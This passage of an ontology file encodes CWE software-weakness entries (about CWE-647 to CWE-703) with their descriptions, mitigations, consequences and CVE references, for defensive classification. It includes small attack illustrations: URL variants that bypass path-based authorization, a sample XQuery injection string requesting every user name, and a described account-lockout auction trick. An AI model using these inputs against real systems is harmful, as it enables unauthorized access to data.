                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "A famous example of this type of weakness being exploited is the eBay attack. eBay always displays the user id of the highest bidder. In the final minutes of the auction, one of the bidders could try to log in as the highest bidder three times. After three incorrect log in attempts, eBay password throttling would kick in and lock out the highest bidder's account for some time. An attacker could then make their own bid and their victim would not have a chance to place the counter bid because they would be locked out. Thus an attacker could win the auction."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     likelihood_of_exploit  "High"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string
    
    
Individual: CWE-647_Use_of_Non-Canonical_URL_Paths_for_Authorization_Decisions

    Annotations: 
        rdfs:comment "If an application defines policy namespaces and makes authorization decisions based on the URL, but it does not require or convert to a canonical URL before making the authorization decision, then it opens the application to attack. For example, if the application only wants to allow access to http://www.example.com/mypage, then the attacker might be able to bypass this restriction using equivalent URLs such as:
 - http://WWW.EXAMPLE.COM/mypage
 - http://www.example.com/%6Dypage (alternate encoding)
 - http://192.168.1.1/mypage (IP address)
 - http://www.example.com/mypage/ (trailing /)
 - http://www.example.com:80/mypage
Therefore it is important to specify access control policy that is based on the path information in some canonical form with all alternate encodings rejected (which can be accomplished by a default deny rule)."^^xsd:string,
        rdfs:comment "The software defines policy namespaces and makes authorization decisions based on the assumption that a URL is canonical. This can allow a non-canonical URL to bypass the authorization."^^xsd:string
    
    Types: 
        Variants
    
    Facts:  
     categories_member  CWE-1011_Authorize_Actors,
     ID  "647"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "An attacker may be able to bypass the authorization mechanism to gain access to the otherwise-protected URL."^^xsd:string
                 
                 access_control  "Bypass Protection Mechanism"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "Make access control policy based on path information in canonical form. Use very restrictive regular expressions to validate that the path is in the expected form."^^xsd:string, 
                 rdfs:comment "Reject all alternate path encodings that are not in the expected canonical form."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "If a non-canonical URL is used, the server may choose to return the contents of the file, instead of pre-processing the file (e.g. as a program)."^^xsd:string
                 
                 confidentiality  "Read Files or Directories"^^xsd:string,
     
     Annotations: rdfs:comment "Example from CAPEC (CAPEC ID: 4, \"Using Alternative IP Address Encodings\"). An attacker identifies an application server that applies a security policy based on the domain and application name, so the access control policy covers authentication and authorization for anyone accessing http://example.domain:8080/application. However, by putting in the IP address of the host the application authentication and authorization controls may be bypassed http://192.168.0.1:8080/application. The attacker relies on the victim applying policy to the namespace abstraction and not having a default deny policy in place to manage exceptions."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     likelihood_of_exploit  "High"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     operation  ""^^xsd:string,
     
     Annotations: rdfs:comment "Undetermined Prevalence"^^xsd:string
                 
                 paradigms  "Web Based"^^xsd:string
    
    
Individual: CWE-649_Reliance_on_Obfuscation_or_Encryption_of_Security-Relevant_Inputs_without_Integrity_Checking

    Annotations: 
        rdfs:comment "The software uses obfuscation or encryption of inputs that should not be mutable by an external actor, but the software does not use integrity checks to detect if those inputs have been modified."^^xsd:string,
        rdfs:comment "When an application relies on obfuscation or incorrectly applied / weak encryption to protect client-controllable tokens or parameters, that may have an effect on the user state, system state, or some decision made on the server. Without protecting the tokens/parameters for integrity, the application is vulnerable to an attack where an adversary blindly traverses the space of possible values of the said token/parameter in order to attempt to gain an advantage. The goal of the attacker is to find another admissible value that will somehow elevate their privileges in the system, disclose information or change the behavior of the system in some way beneficial to the attacker. If the application does not protect these critical tokens/parameters for integrity, it will not be able to determine that these values have been tampered with. Measures that are used to protect data for confidentiality should not be relied upon to provide the integrity service."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1020_Verify_Message_Integrity,
     
     Annotations: rdfs:comment "An IPSec configuration does not perform integrity checking of the IPSec packet as the result of either not configuring ESP properly to support the integrity service or using AH improperly. In either case, the security gateway receiving the IPSec packet would not validate the integrity of the packet to ensure that it was not changed. Thus if the packets were intercepted the attacker could undetectably change some of the bits in the packets. The meaningful bit flipping was possible due to the known weaknesses in the CBC encryption mode. Since the attacker knew the structure of the packet, they were able (in one variation of the attack) to use bit flipping to change the destination IP of the packet to the destination machine controlled by the attacker. And so the destination security gateway would decrypt the packet and then forward the plaintext to the machine controlled by the attacker. The attacker could then read the original message. For instance if VPN was used with the vulnerable IPSec configuration the attacker could read the victim's e-mail. This vulnerability demonstrates the need to enforce the integrity service properly when critical data could be modified by an attacker. This problem might have also been mitigated by using an encryption mode that is not susceptible to bit flipping attacks, but the preferred mechanism to address this problem still remains message verification for integrity. While this attack focuses on the network layer and requires a man in the middle scenario, the situation is not much different at the software level where an attacker can modify tokens/parameters used by the application."^^xsd:string
                 
                 references  CVE-2005-0039,
     
     Annotations: rdfs:comment "Padding Oracle Crypto Attack"^^xsd:string
                 
                 related_attack_patterns  CAPEC-463,
     ID  "649"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "Client side tokens/parameters should not be such that it would be easy/predictable to guess another valid state."^^xsd:string, 
                 rdfs:comment "OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase."^^xsd:string, 
                 rdfs:comment "Obfuscation should not be relied upon. If encryption is used, it needs to be properly applied (i.e. proven algorithm and implementation, use padding, use random initialization vector, user proper encryption mode). Even with proper encryption where the ciphertext does not leak information about the plaintext or reveal its structure, compromising integrity is possible (although less likely) without the provision of the integrity service."^^xsd:string, 
                 rdfs:comment "Protect important client controllable tokens/parameters for integrity using PKI methods (i.e. digital signatures) or other means, and checks for integrity on the server side."^^xsd:string, 
                 rdfs:comment "Repeated requests from a particular user that include invalid values of tokens/parameters (those that should not be changed manually by users) should result in the user account lockout."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     class  "Language-Independent"^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     implementation  ""^^xsd:string,
     
     Annotations: rdfs:comment "The inputs could be modified without detection, causing the software to have unexpected system state or make incorrect security decisions."^^xsd:string
                 
                 integrity  "Unexpected State"^^xsd:string,
     likelihood_of_exploit  "High"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string
    
    
Individual: CWE-652_Improper_Neutralization_of_Data_within_XQuery_Expressions

    Annotations: 
        rdfs:comment "Relationship:
This weakness is similar to other weaknesses that enable injection style attacks, such as SQL injection, command injection and LDAP injection. The main difference is that the target of attack here is the XML database."^^xsd:string,
        rdfs:comment "The net effect is that the attacker will have control over the information selected from the XML database and may use that ability to control application flow, modify logic, retrieve unauthorized data, or bypass important checks (e.g. authentication)."^^xsd:string,
        rdfs:comment "The software uses external input to dynamically construct an XQuery expression used to retrieve data from an XML database, but it does not neutralize or incorrectly neutralizes that input. This allows an attacker to control the structure of the query."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1019_Validate_Inputs,
     ID  "652"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "An attacker might be able to read sensitive information from the XML database."^^xsd:string
                 
                 confidentiality  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "An attacker may pass XQuery expressions embedded in an otherwise standard XML document. The attacker tunnels through the application entry point to target the resource access layer. The string below is an example of an attacker accessing the accounts.xml to request the service provider send all user names back. doc(accounts.xml)//user[name='*'] The attacks that are possible through XQuery are difficult to predict, if the data is not validated prior to executing the XQL."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "Properly validate user input. Reject data where appropriate, filter where appropriate and escape where appropriate. Make sure input that will be used in XQL queries is safe in that context."^^xsd:string, 
                 rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string, 
                 rdfs:comment "Use parameterized queries. This will help ensure separation between data plane and control plane."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     likelihood_of_exploit  "High"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string
    
    
Individual: CWE-653_Insufficient_Compartmentalization

    Annotations: 
        rdfs:comment "Alternate Terms
Separation of Privilege:	
Some people and publications use the term \"Separation of Privilege\" to describe this weakness, but this term has dual meanings in current usage. This node conflicts with the original definition of \"Separation of Privilege\" by Saltzer and Schroeder; that original definition is more closely associated with CWE-654. Because there are multiple interpretations, use of the \"Separation of Privilege\" term is discouraged."^^xsd:string,
        rdfs:comment "Relationship:
There is a close association with CWE-250 (Execution with Unnecessary Privileges). CWE-653 is about providing separate components for each privilege; CWE-250 is about ensuring that each component has the least amount of privileges possible. In this fashion, compartmentalization becomes one mechanism for reducing privileges."^^xsd:string,
        rdfs:comment "Terminology:
The term \"Separation of Privilege\" is used in several different ways in the industry, but they generally combine two closely related principles: compartmentalization (this node) and using only one factor in a security decision (CWE-654). Proper compartmentalization implicitly introduces multiple factors into a security decision, but there can be cases in which multiple factors are required for authentication or other mechanisms that do not involve compartmentalization, such as performing all required checks on a submitted certificate. It is likely that CWE-653 and CWE-654 will provoke further discussion."^^xsd:string,
        rdfs:comment "The product does not sufficiently compartmentalize functionality or processes that require different privilege levels, rights, or permissions."^^xsd:string,
        rdfs:comment "When a weakness occurs in functionality that is accessible by lower-privileged users, then without strong boundaries, an attack might extend the scope of the damage to higher-privileged users."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1011_Authorize_Actors,
     ID  "653"^^xsd:positiveInteger,
     access_control  "Bypass Protection Mechanism"^^xsd:string,
     access_control  "Gain Privileges or Assume Identity"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "Break up privileges between different modules, objects or entities. Minimize the interfaces between modules and require strong access control between them."^^xsd:string, 
                 rdfs:comment "COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string, 
                 rdfs:comment "The exploitation of a weakness in low-privileged areas of the software can be leveraged to reach higher-privileged areas without having to overcome any additional obstacles."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "Example 1
Single sign-on technology is intended to make it easier for users to access multiple resources or domains without having to authenticate each time. While this is highly convenient for the user and attempts to address problems with psychological acceptability, it also means that a compromise of a user's credentials can provide immediate access to all other resources or domains."^^xsd:string, 
                 rdfs:comment "Example 2
The traditional UNIX privilege model provides root with arbitrary access to all resources, but root is frequently the only user that has privileges. As a result, administrative tasks require root privileges, even if those tasks are limited to a small area, such as updating user man pages. Some UNIX flavors have a \"bin\" user that is the owner of system executables, but since root relies on executables owned by bin, a compromise of the bin account can be leveraged for root privileges by modifying a bin-owned executable, such as CVE-2007-4238."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     implementation  ""^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
- Compare binary / bytecode to application permission manifest
Effectiveness: SOAR Partial"^^xsd:string, 
                 rdfs:comment "Analysis - Binary or Bytecode"^^xsd:string
                 
                 static  "automated"^^xsd:string,
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Highly cost effective:
- Manual Source Code Review (not inspections)
Cost effective for partial coverage:
- Focused Manual Spotcheck - Focused manual analysis of source
Effectiveness: High"^^xsd:string, 
                 rdfs:comment "Analysis - Source Code"^^xsd:string
                 
                 static  "manual"^^xsd:string,
     weakness_ordinalities  "Primary"^^xsd:string
    
    
Individual: CWE-656_Reliance_on_Security_Through_Obscurity

    Annotations: 
        rdfs:comment "Alternate Terms:  Never Assuming your secrets are safe"^^xsd:string,
        rdfs:comment "Relationship:
Note that there is a close relationship between this weakness and CWE-603 (Use of Client-Side Authentication). If developers do not believe that a user can reverse engineer a client, then they are more likely to choose client-side authentication in the belief that it is safe."^^xsd:string,
        rdfs:comment "The software uses a protection mechanism whose strength depends heavily on its obscurity, such that knowledge of its algorithms or key data is sufficient to defeat the mechanism."^^xsd:string,
        rdfs:comment "This reliance on \"security through obscurity\" can produce resultant weaknesses if an attacker is able to reverse engineer the inner workings of the mechanism. Note that obscurity can be one small part of defense in depth, since it can create more work for an attacker; however, it is a significant risk if used as the primary means of protection."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1011_Authorize_Actors,
     
     Annotations: rdfs:comment "Hard-coded cryptographic key stored in executable program."^^xsd:string
                 
                 references  CVE-2005-4002,
     
     Annotations: rdfs:comment "Hard-coded hashed values for username and password contained in client-side script, allowing brute-force offline attacks."^^xsd:string
                 
                 references  CVE-2006-4068,
     
     Annotations: rdfs:comment "Reliance on hidden form fields in a web application. Many web application vulnerabilities exist because the developer did not consider that \"hidden\" form fields can be processed using a modified client."^^xsd:string
                 
                 references  CVE-2006-6588,
     
     Annotations: rdfs:comment "Hard-coded cryptographic key stored in executable program."^^xsd:string
                 
                 references  CVE-2006-7142,
     
     Annotations: rdfs:comment "Try All Common Switches"^^xsd:string
                 
                 related_attack_patterns  CAPEC-133,
     ID  "656"^^xsd:positiveInteger,
     applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "Always consider whether knowledge of your code or design is sufficient to break it. Reverse engineering is a highly successful discipline, and financially feasible for motivated adversaries. Black-box techniques are established for binary analysis of executables that use obfuscation, runtime analysis of proprietary protocols, inferring file formats, and others."^^xsd:string, 
                 rdfs:comment "When available, use publicly-vetted algorithms and procedures, as these are more likely to undergo more extensive security analysis and testing. This is especially the case with encryption and authentication."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "The security mechanism can be bypassed easily."^^xsd:string
                 
                 availability  "Other"^^xsd:string,
     
     Annotations: rdfs:comment "The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "The security mechanism can be bypassed easily."^^xsd:string
                 
                 confidentiality  "Other"^^xsd:string,
     
     Annotations: rdfs:comment "The design of TCP relies on the secrecy of Initial Sequence Numbers (ISNs), as originally covered in CVE-1999-0077. If ISNs can be guessed (due to predictability, CWE-330) or sniffed (due to lack of encryption, CWE-311), then an attacker can hijack or spoof connections. Many TCP implementations have had variations of this problem over the years, including CVE-2004-0641, CVE-2002-1463, CVE-2001-0751, CVE-2001-0328, CVE-2001-0288, CVE-2001-0163, CVE-2001-0162, CVE-2000-0916, and CVE-2000-0328.

Example 1 References:
[REF-542] Jon Postel, Editor. \"RFC: 793, TRANSMISSION CONTROL PROTOCOL\". Information Sciences Institute. 1981-09. <http://www.ietf.org/rfc/rfc0793.txt>."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     
     Annotations: rdfs:comment "The security mechanism can be bypassed easily."^^xsd:string
                 
                 integrity  "Other"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     operation  ""^^xsd:string,
     
     Annotations: rdfs:comment "The security mechanism can be bypassed easily."^^xsd:string
                 
                 other  "Other"^^xsd:string,
     
     Annotations: rdfs:comment "where the weakness exists independent of other weaknesses"^^xsd:string
                 
                 weakness_ordinalities  "Primary"^^xsd:string
    
    
Individual: CWE-668_Exposure_of_Resource_to_Wrong_Sphere

    Annotations: 
        rdfs:comment "Resources such as files and directories may be inadvertently exposed through mechanisms such as insecure permissions, or when a program accidentally operates on the wrong object. For example, a program may intend that private files can only be provided to a specific user. This effectively defines a control sphere that is intended to prevent attackers from accessing these private files. If the file permissions are insecure, then parties other than the user will be able to access those files.

A separate control sphere might effectively require that the user can only access the private files, but not any other files on the system. If the program does not ensure that the user is only requesting private files, then the user might be able to access other files on the system.

In either case, the end result is that a resource has been exposed to the wrong party."^^xsd:string,
        rdfs:comment "Theoretical:
A \"control sphere\" is a set of resources and behaviors that are accessible to a single actor, or a group of actors. A product's security model will typically define multiple spheres, possibly implicitly. For example, a server might define one sphere for \"administrators\" who can create new user accounts with subdirectories under /home/server/, and a second sphere might cover the set of users who can create or delete files within their own subdirectories. A third sphere might be \"users who are authenticated to the operating system on which the product is installed.\" Each sphere has different sets of actors and allowable behaviors."^^xsd:string,
        rdfs:comment "Try All Common Switches"^^xsd:string
    
    Types: 
        Classes
    
    Facts:  
     categories_member  CWE-1011_Authorize_Actors,
     ID  "668"^^xsd:positiveInteger,
     architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     confidentiality  "Modify Application Data"^^xsd:string,
     confidentiality  "Other"^^xsd:string,
     confidentiality  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     integrity  "Modify Application Data"^^xsd:string,
     integrity  "Other"^^xsd:string,
     integrity  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     operation  ""^^xsd:string,
     other  ""^^xsd:string,
     other  "Modify Application Data"^^xsd:string,
     other  "Other"^^xsd:string,
     other  "Read Application Data"^^xsd:string
    
    
Individual: CWE-669_Incorrect_Resource_Transfer_Between_Spheres

    Annotations: 
        rdfs:comment "Background Details:
A \"control sphere\" is a set of resources and behaviors that are accessible to a single actor, or a group of actors. A product's security model will typically define multiple spheres, possibly implicitly. For example, a server might define one sphere for \"administrators\" who can create new user accounts with subdirectories under /home/server/, and a second sphere might cover the set of users who can create or delete files within their own subdirectories. A third sphere might be \"users who are authenticated to the operating system on which the product is installed.\" Each sphere has different sets of actors and allowable behaviors."^^xsd:string,
        rdfs:comment "The product does not properly transfer a resource/behavior to another sphere, or improperly imports a resource/behavior from another sphere, in a manner that provides unintended control over that resource."^^xsd:string
    
    Types: 
        Classes
    
    Facts:  
     categories_member  CWE-1011_Authorize_Actors,
     ID  "669"^^xsd:positiveInteger,
     architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     confidentiality  "Modify Application Data"^^xsd:string,
     confidentiality  "Read Application Data"^^xsd:string,
     confidentiality  "Unexpected State"^^xsd:string,
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     integrity  "Modify Application Data"^^xsd:string,
     integrity  "Read Application Data"^^xsd:string,
     integrity  "Unexpected State"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     operation  ""^^xsd:string
    
    
Individual: CWE-671_Lack_of_Administrator_Control_over_Security

    Annotations: 
        rdfs:comment "If the product's administrator does not have the ability to manage security-related decisions at all times, then protecting the product from outside threats - including the product's developer - can become impossible. For example, a hard-coded account name and password cannot be changed by the administrator, thus exposing that product to attacks that the administrator can not prevent."^^xsd:string,
        rdfs:comment "The product uses security features in a way that prevents the product's administrator from tailoring security settings to reflect the environment in which the product is being used. This introduces resultant weaknesses or prevents it from operating at a level of security that is desired by the administrator."^^xsd:string
    
    Types: 
        Classes
    
    Facts:  
     categories_member  CWE-1011_Authorize_Actors,
     ID  "671"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     implementation  ""^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     other  "Varies by Context"^^xsd:string
    
    
Individual: CWE-673_External_Influence_of_Sphere_Definition

    Annotations: 
        rdfs:comment "The product does not prevent the definition of control spheres from external actors."^^xsd:string,
        rdfs:comment "Theoretical:
A \"control sphere\" is a set of resources and behaviors that are accessible to a single actor, or a group of actors. A product's security model will typically define multiple spheres, possibly implicitly. For example, a server might define one sphere for \"administrators\" who can create new user accounts with subdirectories under /home/server/, and a second sphere might cover the set of users who can create or delete files within their own subdirectories. A third sphere might be \"users who are authenticated to the operating system on which the product is installed.\" Each sphere has different sets of actors and allowable behaviors."^^xsd:string,
        rdfs:comment "Typically, a product defines its control sphere within the code itself, or through configuration by the product's administrator. In some cases, an external party can change the definition of the control sphere. This is typically a resultant weakness."^^xsd:string
    
    Types: 
        Classes
    
    Facts:  
     categories_member  CWE-1011_Authorize_Actors,
     ID  "673"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "Consider a blog publishing tool, which might have three explicit control spheres: the creation of articles, only accessible to a \"publisher;\" commenting on articles, only accessible to a \"commenter\" who is a registered user; and reading articles, only accessible to an anonymous reader. Suppose that the application is deployed on a web server that is shared with untrusted parties. If a local user can modify the data files that define who a publisher is, then this user has modified the control sphere. In this case, the issue would be resultant from another weakness such as insufficient permissions."^^xsd:string, 
                 rdfs:comment "In Untrusted Search Path (CWE-426), a user might be able to define the PATH environment variable to cause the product to search in the wrong directory for a library to load. The product's intended sphere of control would include \"resources that are only modifiable by the person who installed the product.\" The PATH effectively changes the definition of this sphere so that it overlaps the attacker's sphere of control."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     implementation  ""^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     other  "Other"^^xsd:string
    
    
Individual: CWE-703_Improper_Check_or_Handling_of_Exceptional_Conditions

    Annotations: 
        rdfs:comment "Relationship:
This is a high-level class that might have some overlap with other classes. It could be argued that even \"normal\" weaknesses such as buffer overflows involve unusual or exceptional conditions. In that sense, this might be an inherent aspect of most other weaknesses within CWE, similar to API Abuse (CWE-227) and Indicator of Poor Code Quality (CWE-398). However, this entry is currently intended to unify disparate concepts that do not have other places within the Research Concepts view (CWE-1000)."^^xsd:string,
        rdfs:comment "The software does not properly anticipate or handle exceptional conditions that rarely occur during normal operation of the software."^^xsd:string
    
    Types: 
        Classes
    
    Facts:  
     categories_member  CWE-1012_Cross_Cutting,
     ID  "703"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Highly cost effective:
- Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)
- Formal Methods / Correct-By-Construction
Effectiveness: High"^^xsd:string
                 
                 architecture_or_design_review  ""^^xsd:string,
     availability  "DoS: Crash, Exit, or Restart"^^xsd:string,
     availability  "Read Application Data"^^xsd:string,
     availability  "Unexpected State"^^xsd:string,
     
     Annotations: rdfs:comment "The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     confidentiality  "DoS: Crash, Exit, or Restart"^^xsd:string,
     confidentiality  "Read Application Data"^^xsd:string,
     confidentiality  "Unexpected State"^^xsd:string,
     
     Annotations: rdfs:comment "Analysis with Manual Results Interpretation

According to SOAR, the following detection techniques may be useful:
Highly cost effective:
Fault Injection - source code
Fault Injection - binary
Cost effective for partial coverage:
Forced Path Execution
Effectiveness: High"^^xsd:string
                 
                 dynamic  "manual"^^xsd:string,
     
